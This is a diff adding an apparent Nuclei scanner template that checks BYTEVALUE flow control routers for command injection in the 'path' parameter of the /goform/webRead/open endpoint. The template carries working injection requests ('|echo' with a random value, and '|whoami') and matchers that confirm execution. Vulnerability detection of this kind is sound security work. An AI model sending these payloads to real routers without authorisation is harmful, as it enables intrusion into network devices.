@@ -1,0 +1,45 @@
+id: bytevalue-command-execution
+info:
+  name: BYTEVALUE Intelligent Flow Control Router Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    BYTEVALUE flow control router's `/goform/webRead/open` endpoint contains a command injection vulnerability in the `path` parameter.
+    This vulnerability could allow an attacker to execute commands on the server, write backdoors, and control the entire router.
+  reference:
+    - http://www.bytevalue.com/
+variables:
+  random_hex: '{{rand_base(8)}}'
+http:
+  - raw:
+      - |
+        GET /goform/webRead/open/?path=|echo {{random_hex}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "{{random_hex}}"
+        part: body
+      - type: word
+        words:
+          - "echo {{random_hex}}"
+        part: body
+        negative: true
+  - raw:
+      - |
+        GET /goform/webRead/open/?path=|{{cmd}} HTTP/1.1
+        Host: {{Hostname}}
+    payloads:
+      cmd:
+        - "whoami"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: regex
+        regex:
+          - "^[a-zA-Z0-9-_]+"
+        part: body
